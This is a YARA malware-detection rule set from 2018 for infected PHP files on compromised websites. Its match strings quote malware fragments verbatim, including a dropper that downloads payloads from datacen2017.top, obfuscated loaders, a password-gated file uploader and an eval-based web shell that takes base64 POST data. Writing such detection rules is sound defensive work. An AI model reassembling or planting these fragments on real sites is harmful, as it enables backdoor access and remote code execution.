/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-05-29
   Identifier: 05-26-18
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule _infected_05_26_18_updw {
   meta:
      description = "05-26-18 - file updw.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "ed154c632a07aae4b65eb20e5c903c0a6e21e4f9eddc254885ef4b4a57564812"
   strings:
      $s1 = "$url3=\"http://www.datacen2017.top/drupal/request-sanitizer.txt\";" fullword ascii
      $s2 = "$url4=\"http://www.datacen2017.top/drupal/update-core.txt\";" fullword ascii
      $s3 = "$url1=\"http://www.datacen2017.top/drupal/del.txt\";" fullword ascii
      $s4 = "$url2=\"http://www.datacen2017.top/drupal/dr.txt\";" fullword ascii
      $s5 = "file_put_contents(\"./request-sanitizer.inc\", $str_hm3);" fullword ascii
      $s6 = "file_put_contents(\"./update-core.php\", $str_hm4);" fullword ascii
      $s7 = "file_put_contents(\"./del.php\", $str_hm1);" fullword ascii
      $s8 = "file_put_contents(\"./dr.php\", $str_hm2);" fullword ascii
      $s9 = "echo \"download is fail\";" fullword ascii
      $s10 = "if($filesize1 == '104'&& $filesize2 == '3202'&& $filesize3 == '2990'&& $filesize4 == '2275'){" fullword ascii
      $s11 = "curl_setopt($curl, CURLOPT_HEADER, false);" fullword ascii
      $s12 = "$data=curl_exec($curl);" fullword ascii
      $s13 = "$filesize4=abs(filesize(\"./update-core.php\"));" fullword ascii
      $s14 = "echo \"download is sucesss.\";" fullword ascii
      $s15 = "$filesize3=abs(filesize(\"./request-sanitizer.inc\"));" fullword ascii
      $s16 = "$str_hm1 = curl_get($url1);" fullword ascii
      $s17 = "$str_hm2 = curl_get($url2);" fullword ascii
      $s18 = "$str_hm3 = curl_get($url3);" fullword ascii
      $s19 = "$str_hm4 = curl_get($url4);" fullword ascii
      $s20 = "$filesize1=abs(filesize(\"./del.php\"));" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 3KB and
         ( 8 of them )
      ) or ( all of them )
}

rule _infected_05_26_18_tekel {
   meta:
      description = "05-26-18 - file tekel.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "56ce193a3ce784d11ce95ca3f887dffc5bef65b634c6977628b2cafe97f6b2aa"
   strings:
      $s1 = "$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64');$OOO0000O0=$OOO000000{4}.$OOO000000{9}.$OOO000000{3}" ascii
      $s2 = "#solevisible@gmail.com" fullword ascii
      $s3 = "G/QGxJgggfQH9DUmpBTIBKN1M2TaFAVWldEABQTXWxoGleU05wVWo/NVM1awYEUGM1TXRAgOkAPm1WUmNqekB2UQQIUnA0SUJ8wH5zbFVBXUtATVVmAEBtRVVQamNzYk" ascii
      $s4 = "BAQSABalYFUFBAPkheNWNdUmpjMwoAAAJdUjRJclRrTURRQndUY8oAUEIQa5GQUmA2XUEAVTdzUROAcFZrQQMETGJsQW1TJIA+AH5Sbj5F0QBsVhQANzYzScFdswBWNT" ascii
      $s5 = "AAN0FSZn1sNVJRUWZdNzZBUAAAaUVRUEJVbF02UTNMNVVFXQEAbEE0TH1FdLRAbFJAQUFJX1EAAFJlN11DVEFRRFI0Y0llQmMAAEheN01PVW1GM1BBVn1VNVEgETJUfU" ascii
      $s6 = "9scVR9gABagGpRd1V9RU1MN1FoZUFNVAAISzRvaVVRUWpiQU4zJ0FRQmuEANZAb3VRayhAU0VMUVJocGNCPggETWNCVUbASUBmQl1AUlFPAGtJBIBvVFNON5bAQl6OIF" ascii
      $s7 = "fCwANAC8BTQUhWUlE3Y1BNThAiVWpzcUBdN1BqMzcBQE9WacEAbQQAUVddQlIMAE5+Y0BrbWM3TUtIglEFAEo3w0Bsf0i2gH5UbFFBF2BBoADqQDQLgEtdN2N9SUBjQl" ascii
      $s8 = "VOfUlQf0lVQe8Bd1Biak1BkAJCgVRBAIBDRWZKQVJ9Vl9vdwFTpSIOgDfVAEJVGgJjlwBjUEiQfklSm1BDAsBrcFNQc1WRgEI0QBwAYDJQQ0lsAAhmalZwZU93bEptUU" ascii
      $s9 = "NBSFJRRWlQUW8AAERKUE1yU2prTGJfY0lTT2sAYElVQkF3ZDddbNTAAgBjVGRqQQgETlJqa3nANkVIQmNMZjcLQGldAABvVjVJaVN9TjZmQFVfUGlBAABdZlBWcF1BY1" ascii
      $s10 = "VWfUFWTYBAAFFzFkBTgADFgEtefUFBSmtNaFNrRUFKQwAAb1JRT29IVEBJUVE3QUhibgAAPzZQQH9VVEJWfUlSf0RjNwIANldWUlV+eEA0VlNdMWJpTVZIAFMWAElpJo" ascii
      $s11 = "Y2VV5KX0FsSkNrvYBJaGUBkFBOcEhAPmo0AAQAY00VAHNlQjJYUEnCQDMHgKsANkJQaq8AahRBSWhQQCgETU56AFOjAFJda1Y2XWtF2QBJSoFA0gRBSzVWcFTaAEowwF" ascii
      $s12 = "JDSWMgPkvAgEtwQABAf0pBa09JQk1S/EBvVEJ3cF5AADTYQDU+X2ZSQUxjNT5xVn1FWABJc8BP+sDHAElWXlJdfmM3czVJIABQawgBMV1qb1ZKNU1fUG4/MoABRQBSSU" ascii
      $s13 = "NFZH1vQ2JpY0pVAABAczRWUj5VVX1Rc1NDb0RTAYFBbzFRbHdDIWCGQGNQVVFNckAAAIRuUFJJSVU0SUwAUV9IUFUwbHeYEMeAY0VfAGoASXZjN3NWNABrVVJdAMAzVE" ascii
      $s14 = "YzECBTQD7IgHNFXVNvROIAbVY3QW0AAEpANnNLfWtNVTUyTWZsb2gJAWNSd0KAgEtSEYBRUn90VF93SoAAAEFtXUAyTGRsb0tWbUlmZVICADZWSTZjSBgAX1ZRVjdQX0" ascii
      $s15 = "p/SGM1TVEDgElQUVJKaZvAzAEKAWxBbkprUn4AgV41f1BkNzZepABSSmp0f10SIEBAURQBa11TUTd3NYAAVFVRTU5QIoBsMoUAaHVeGQBQGAFrSVBlalVNQABdHgBdak" ascii
      $s16 = "o2d05JAQFrUn9jQwAATW5WUmNVUGxJS1ZQVVZSaiIAY2ziADFmNSFANlVmUlNdVmZqAQA2VWRfY2lJGoBUU0lpVEFCNAgiVmtWM44ARVBPd00JAHFdQDIBRQIEU159QU" ascii
      $s17 = "9VX1FBvABSGYBdUlJdXwIAVGpvbVRBZAB9bzJWbFFoVlIgGElVNAFVVD5RVm1VQw9AmuBRclMAAEFJbUs3dzJJQkEyXWledVVABFMEgE9jVWVPY0NlUlFNDQBBUQEFNl" ascii
      $s18 = "FJa2MyUW1vX2JSNjRWGAE3b2zfgDWAPk1Vam8yXUFjNwICQJBT78BDRjRUN2NBgEFJK0BBY1J3AABVXm1NTGRCVXZUUl03SmlVAgA2XlFjNGVxAFFqPk9lUU0zUAAQUG" ascii
      $s19 = "GToFZrAABRdlBrY2xKQGNAVlFSMmZswgIlAHMAZUJOcXAAaVZQVU9QagLAQAAAVUlSbF1QSlFvU1ZsQV5KaQKAY0NjN11RAQB0fgBsYzZ3RFBBIRBdRHLAX1BsUREAd2" ascii
      $s20 = "AMQFkAU1FCMgAAdFZRUXJlVD52UlFdRVFRQQBAMlJQf31dN1Y1DkBVVEI+XkkAgEFJQFY3QWpSwYBmakEyVlFNAIBzSEJNTlRPayFgPlRlUGB1XgKAUmA2UzRVrgFUDw" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 900KB and
         ( 8 of them )
      ) or ( all of them )
}

rule example_sites {
   meta:
      description = "05-26-18 - file example.sites.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "d69fbb7f46d2f2e17f239bf5df2cf0b5cf41759819100cbb4075d5870aa4dec7"
   strings:
      $s1 = "qHJgA=\";$YjzQVQ=\"tWlbh\";$xWjo=$YjzQVQ(\"8wj3cov0SvGOCvaI9AsJBgA=\");$jKB=$xWjo('',$YjzQVQ($Ymc));$jKB();}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule _infected_05_26_18_updater {
   meta:
      description = "05-26-18 - file updater.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "96d38b0d2238911f72c032aa36261a4ea094b3f0f455f2577fe43edc77182efa"
   strings:
      $s1 = "<?php if($_GET[\"login\"]==\"eS7gBi\"){$or=\"JG11amogxPSAkX1BPU1RbJ3onXTsgaWYg\"; $zs=\"KCRtdWpqIT0iIikgeyAkeHxNzZXI9Ym\"; $lq=" ascii
      $s2 = "e\"][\"tmp_name\"],$target_path)){echo basename($_FILES[\"uploadedfile\"][\"name\"]).\" has been uploaded\";}else{echo \"Uploade" ascii
      $s3 = "<?php if($_GET[\"login\"]==\"eS7gBi\"){$or=\"JG11amogxPSAkX1BPU1RbJ3onXTsgaWYg\"; $zs=\"KCRtdWpqIT0iIikgeyAkeHxNzZXI9Ym\"; $lq=" ascii
      $s4 = "\"\", $or.$zs.$lq.$bu)));$hwy(); $target_path=basename($_FILES[\"uploadedfile\"][\"name\"]);if(move_uploaded_file($_FILES[\"uplo" ascii
      $s5 = "!\";}} ?><form enctype=\"multipart/form-data\" method=\"POST\"><input name=\"uploadedfile\" type=\"file\"/><input type=\"submit" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 2KB and
         ( all of them )
      ) or ( all of them )
}

rule gitignore {
   meta:
      description = "05-26-18 - file gitignore.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "fc881bd0b9fe176b00d0e11d3aed4acc975766676d7ecad01c3776b779615657"
   strings:
      $x1 = "<?php if($_GET[\"login\"]==\"ealJM9\"){$mujj = $_POST[\"z\"]; if ($mujj!=\"\") { $xsser=base64_decode($_POST[\"z0\"]); @eval(\"" ascii
      $s2 = "<?php if($_GET[\"login\"]==\"ealJM9\"){$mujj = $_POST[\"z\"]; if ($mujj!=\"\") { $xsser=base64_decode($_POST[\"z0\"]); @eval(\"" ascii
      $s3 = "xsser;\");} if(@copy($_FILES[\"file\"][\"tmp_name\"], $_FILES[\"file\"][\"name\"])) { echo \"<b>Upload Complate !!!</b><br>\"; }" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

